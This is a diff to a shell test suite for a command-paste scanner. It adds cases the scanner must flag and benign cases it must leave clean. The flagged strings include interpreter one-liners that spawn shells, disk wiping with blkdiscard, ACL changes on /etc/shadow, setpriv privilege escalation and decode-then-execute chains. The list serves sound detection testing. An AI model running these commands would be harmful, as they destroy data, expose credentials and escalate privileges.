@@ -11671,6 +11671,78 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-235: interpreter -e exec, npx-URL, git upload-pack, exec -a,
+#   setcap/setfacl, blkdiscard/swapoff, netns/setpriv, misc exec vectors
+for c in \
+    'node -e "require(\"child_process\").exec(\"id\")"' \
+    'node -e "const c=require(\"child_process\");c.spawn(\"id\")"' \
+    'python -c "import os;os.system(\"id\")"' \
+    'python3 -c "import subprocess;subprocess.call(\"id\")"' \
+    'python -c "import os;os.popen(\"id\")"' \
+    'perl -e "system(\"id\")"' 'ruby -e "exec(\"id\")"' \
+    'php -r "exec(\"id\")"' 'php -r "shell_exec(\"id\")"' \
+    'lua -e "os.execute(\"id\")"' 'rscript -e "system(\"id\")"' \
+    'npx http://x/pkg' 'npx git+https://x' \
+    'pnpm dlx http://x' 'bunx http://x' 'yarn dlx http://x' \
+    'git clone --upload-pack="id" x' 'git clone -u "id" x' \
+    'exec -a sleep evil' 'exec -a "[kworker]" evil' \
+    'setcap cap_net_raw+ep x' 'setcap cap_sys_admin+ei x' \
+    'setfacl -m u::rwx /etc/shadow' 'setfacl -m g::rwx /etc/sudoers' \
+    'blkdiscard /dev/sda' 'blkdiscard -s /dev/sda' \
+    'swapoff -a' 'swapoff /swapfile' \
+    'ip netns exec ns bash' 'netns exec ns sh' \
+    'setpriv --reuid 0 sh' 'setpriv --inh-caps +all sh' \
+    'setpriv --bounding-set +all sh' 'setpriv --ruid 0 sh' \
+    'bwrap --bind / / sh' 'bwrap --dev-bind /dev /dev sh' \
+    'bwrap --ro-bind / / sh' \
+    'emacs -batch -l /tmp/x.el' 'emacs --eval "(shell-command \"id\")"' \
+    'sed -e "1e id" f' "sed '1e id' f" \
+    'rsync --rsh="evil" a b' \
+    'base64 -d x > y && chmod +x y && ./y' \
+    'base64 -d x > y; ./y' 'base64 --decode x > y; ./y' \
+    'gpg -d x.gpg | sh' 'gpg --decrypt x | bash' \
+    'gpg -d x.gpg > y && ./y' 'openssl aes -d -in x > y; ./y' \
+    'xxd -r x > y && ./y' 'update-rc.d evil defaults' \
+    'chkconfig evil on' 'rc-update add evil' \
+    'update-rc.d evil enable'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'sed -e "s/x/y/" f' "sed -i 's/a/b/' f" 'sed -n "1p" f' \
+         'sed the stream editor' 'use sed to replace' \
+         'node is a runtime' \
+         'the python interpreter' 'npx eslint .' 'npx create-react-app' \
+         'pnpm dlx vite' 'bunx vite' 'yarn dlx vite' \
+         'git clone https://x/y' 'git clone -b main x' \
+         'exec the command' 'executive summary' \
+         'setfacl -m u::r /tmp/x' 'setfacl -b /tmp/x' \
+         'acl permissions setfacl' 'cap_net_raw docs' \
+         'install capability flags' 'the swapoff utility' \
+         'swap space' 'swapoff discussion' \
+         'the blkdiscard tool' 'blk discard feature' \
+         'emacs docs' 'the emacs editor' \
+         'rsync -avz a b' 'rsync -e ssh a b' 'sync files' \
+         'chkconfig --list' 'rc-update show' 'update-rc.d --help' \
+         'chkconfig docs' 'update the rc.d scripts' \
+         'bwrap is a sandbox tool' 'netns is a namespace' \
+         'the setpriv command' 'the namespace' \
+         'gpg -d file.gpg > out' 'gpg --decrypt-only x' \
+         'xxd file > hex' \
+         'decrypt with gpg' 'the gpg binary' \
+         'base64 encoded data' 'openssl version'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+# bare interpreter -e without exec verb stays LOG or below
+for c in 'python -c "print(1)"' 'node -e "x=1"' \
+         'perl -e "print 1"' 'php -r "echo 1"'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste FP guard: bare -e $c sub-ALERT" "0" "1" \
+        || check "paste FP guard: bare -e $c sub-ALERT" "0" "0"
+done
+
 # ── cycle-234: miner exec, terminal injection, agent kill, env exfil, winrm,
 #   timestomp, dd/mkfs device args, sudo/su stdin-password pipes
 for c in \
